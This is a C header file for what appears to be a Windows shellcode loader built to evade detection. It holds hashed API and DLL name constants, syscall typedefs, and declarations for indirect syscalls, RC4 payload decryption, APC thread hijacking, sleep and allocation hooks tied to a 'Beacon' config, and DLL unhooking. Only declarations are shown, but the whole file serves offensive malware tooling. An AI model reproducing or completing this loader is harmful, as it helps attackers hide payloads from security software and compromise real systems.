#pragma once


#ifndef _HEADER_H_
#define _HEADER_H_

#include <Windows.h>

#define NtCurrentThread()  ((HANDLE)(LONG_PTR)-2)
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

#define MY_FILE     0x122
#define SLEEPTODO   0x471

//----------------------------------------------------------------------------------------------------------------------------------------------------
//                                                                 TYPES: API & SYSCALLS
#ifndef TYPES
#define TYPES

#include "Structs.h"

typedef  NTSTATUS(NTAPI* fnRtlRegisterWait)(HANDLE* out, HANDLE handle, WAITORTIMERCALLBACKFUNC callback, PVOID context, ULONG milliseconds, ULONG flags);

typedef NTSTATUS (NTAPI* fnNtProtectVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, PULONG NumberOfBytesToProtect,  ULONG NewAccessProtection, PULONG OldAccessProtection);

typedef NTSTATUS(NTAPI* fnNtCreateThreadEx)(PHANDLE hThread, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID lpStartAddress, PVOID lpParameter, ULONG Flags, SIZE_T StackZeroBits, SIZE_T SizeOfStackCommit, SIZE_T SizeOfStackReserve, PVOID lpBytesBuffer);

typedef NTSTATUS(NTAPI* fnNtCreateEvent)(PHANDLE EventHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, EVENT_TYPE EventType, BOOLEAN InitialState);

typedef NTSTATUS(NTAPI* fnNtWaitForSingleObject)(HANDLE ObjectHandle, BOOLEAN Alertable, PLARGE_INTEGER TimeOut);

typedef NTSTATUS(NTAPI* fnNtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG ZeroBits, PULONG RegionSize, ULONG AllocationType, ULONG Protect);

typedef NTSTATUS(NTAPI* fnNtFreeVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, PULONG RegionSize, ULONG FreeType);

typedef NTSTATUS(NTAPI* fnNtQueueApcThread)(HANDLE ThreadHandle, PIO_APC_ROUTINE ApcRoutine, PVOID ApcRoutineContext, PIO_STATUS_BLOCK ApcStatusBlock, ULONG ApcReserved);


#endif // !TYPES


//----------------------------------------------------------------------------------------------------------------------------------------------------



//----------------------------------------------------------------------------------------------------------------------------------------------------
//                                                                  STRING HASHED
#define rsrc_Rotr32				0x73352783
#define NTDLLDLL_Rotr32         0x0991077F
#define KERNEL32DLL_Rotr32      0xBD8C342D
#define ADVAPI32DLL_Rotr32      0xBD3C7080
#define CRYPTSPDLL_Rotr32       0xBC5A378A
#define LdrLoadDll_Rotr32       0x3B8CD317
#define NtContinue_Rotr32       0x52B0A670
#define RtlRegisterWait_Rotr32  0x5E1BD17B
#define SystemFunction032_Rotr32        0x549F75B1
#define NtAllocateVirtualMemory_Rotr32  0xBA329384
#define NtProtectVirtualMemory_Rotr32   0x50A532D4
#define NtCreateThreadEx_Rotr32         0x20037949
#define NtQueueApcThread_Rotr32         0x36CA4520
#define NtWaitForSingleObject_Rotr32    0x1435DF61
#define NtSetEvent_Rotr32               0xAA812D4F
#define Sleep_Rotr32            0x65595730
#define VirtualAlloc_Rotr32     0x9C9F7DFE
#define VirtualProtect_Rotr32   0x60A5DF42
#define NtCreateEvent_Rotr32    0xFEB1837F
#define NtFreeVirtualMemory_Rotr32      0x5D017FA0

#define RtlInitUnicodeString_Rotr32     0xC3FDB24C
#define NtOpenSection_Rotr32			0x0F9F525A
#define NtMapViewOfSection_Rotr32       0x29FD030F
#define NtUnmapViewOfSection_Rotr32     0x9FFD77E9

//----------------------------------------------------------------------------------------------------------------------------------------------------



//----------------------------------------------------------------------------------------------------------------------------------------------------
//                                                                      RC4 ALGO
#ifndef RC4_H
#define RC4_H






#endif // !RC4_H

//----------------------------------------------------------------------------------------------------------------------------------------------------



//----------------------------------------------------------------------------------------------------------------------------------------------------
//                                                                   API HASHING

#ifndef _API_HASHING
#define _API_HASHING

FARPROC GetProcAddressF(DWORD64 ModuleHash, DWORD64 ApiHash);
HMODULE GetModuleHandleH(DWORD64 ModuleHash);
FARPROC GetProcAddressH(HMODULE hModule, DWORD64 ApiHash);
HMODULE LdrLoadDll(LPSTR ModuleName);

#endif // !_API_HASHING

//----------------------------------------------------------------------------------------------------------------------------------------------------



//----------------------------------------------------------------------------------------------------------------------------------------------------
//                                                                      HOOKS
#ifndef _HOOK_H
#define _HOOK_H


#define SLEEPHOOK				0xA4
#define VIRTUALALLOCHOOK		0xB2

BOOL InitializeBeaconConfig();

VOID InstallHooks(int FuncToHook);


#endif // !_HOOK_H
//----------------------------------------------------------------------------------------------------------------------------------------------------



//----------------------------------------------------------------------------------------------------------------------------------------------------
//                                                                  LOADER
#ifndef _LOADER_H
#define _LOADER_H

PVOID NtAllocateAndSet(unsigned char* key, PBYTE Payload, SIZE_T SizeOfPayload);

HANDLE LocalApcHijack(PVOID pPayload);

VOID DecryptMemPayload(unsigned char* key, PVOID pClean, PVOID pRun, SIZE_T Size);

VOID NtCreateTimer(PVOID pAddress, DWORD Size, DWORD SleepTime);

VOID SucrificeThread(DWORD plMilliSeconds, INT TODO);


#endif // !_LOADER_H
//----------------------------------------------------------------------------------------------------------------------------------------------------



//----------------------------------------------------------------------------------------------------------------------------------------------------
//                                                                  SYSCALLS
#ifndef _SYSCALLS_H
#define _SYSCALLS_H

BOOL FetshSyscall(DWORD64 Rotr32Hash);

WORD FetshSysNmbr();

extern VOID PlaceSysNmbr(WORD wSystemCall);

extern SysExec();

#endif // !_SYSCALLS_H

//----------------------------------------------------------------------------------------------------------------------------------------------------



//----------------------------------------------------------------------------------------------------------------------------------------------------
//                                                                  WIN32                 
#ifndef _WIN32_H
#define _WIN32_H

SIZE_T StrLenA(LPCSTR String);

SIZE_T StrLenW(LPCWSTR String);

DWORD64 Rotr32A(PCHAR String);

VOID ZM2(PVOID Destination, SIZE_T Size);

PVOID CP2(PVOID Destination, CONST PVOID Source, SIZE_T Length);

CHAR UC(char c);

SIZE_T AToW(PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed);

wchar_t* _strcat(wchar_t* dest, const wchar_t* src);

wchar_t* _strcpy(wchar_t* dest, const wchar_t* src);


#endif // !_WIN32_H
//----------------------------------------------------------------------------------------------------------------------------------------------------
//                                                              known Dll Unhook
BOOL FixAllDlls();

//----------------------------------------------------------------------------------------------------------------------------------------------------


#endif // !_HEADER_H_
